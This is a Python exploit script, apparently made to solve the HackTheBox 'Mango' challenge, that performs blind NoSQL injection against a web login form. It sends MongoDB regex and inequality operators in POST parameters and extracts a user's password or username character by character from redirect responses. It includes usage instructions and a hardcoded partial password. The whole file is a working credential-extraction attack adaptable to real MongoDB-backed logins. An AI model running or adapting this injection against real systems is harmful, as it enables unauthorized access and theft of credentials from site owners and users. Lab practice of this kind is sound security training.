#!/usr/bin/python3
# Blind noSQL injection exploit meant to solve a challenge in HackTheBox// platform
# ORIGIN CODE FROM swisskyrepo/PayloadsAllTheThings REPO

import requests
import json
import urllib3
import string
import urllib
import sys

# DISABLE urllib WARNINGS
urllib3.disable_warnings()

url = "http://staging-order.mango.htb/index.php"
password_ = "t9KcS3>!0B"
username_ = ""
headers = {'application' : 'x-www-form-urlencoded'}


if len(sys.argv) != 3:
	print("USAGE : you may extract the 1st password then try to extract the 2nd one or vice versa ")
	print("    ./mango_blindInjection_exploit.py getpass/getuser arg")
	print("- to extract the password of a user called admin:")
	print("    ./mango_blindInjection_exploit.py getpass admin")
	print("- to extract the username from a password:")
	print("    ./mango_blindInjection_exploit.py getuser PASS")
	exit()

method = sys.argv[1]
arg = sys.argv[2]
# arg="t9KcS3>!0B"

if method == "getpass":
	print("[+] Tring To get the Password..")
elif method == "getuser":
	print("[+] Tring To get Username..")

while True:
	for c in string.printable:
		print(c)
		if c not in ['*','+','?','|', '', '.']: # DEInclude Characters
			if method == "getpass":
				payload = {'username[$eq]':'%s' %(arg), 'password[$regex]': '^%s' %(password_ + c), 'login' : 'login' }
				post_req = requests.post(url, data = payload, headers = headers, verify = False, allow_redirects = False)
				if post_req.status_code == 302:
					print("[+] Found one more char : %s" % (password_ + c))
					password_ += c
			elif method == "getuser": 
				payload = {'username[$regex]':'^%s' % (username_ + c), 'password[$ne]': '%s' %(arg), 'login' : 'login' }
				post_req = requests.post(url, data = payload, headers = headers, verify = False, allow_redirects = False)
				if post_req.status_code == 302:
					print("[!] Found one more char : %s" % (username_+c))
					username_ += c
			else:
				print("[!] Method not recognized")
				exit()
	print("done")

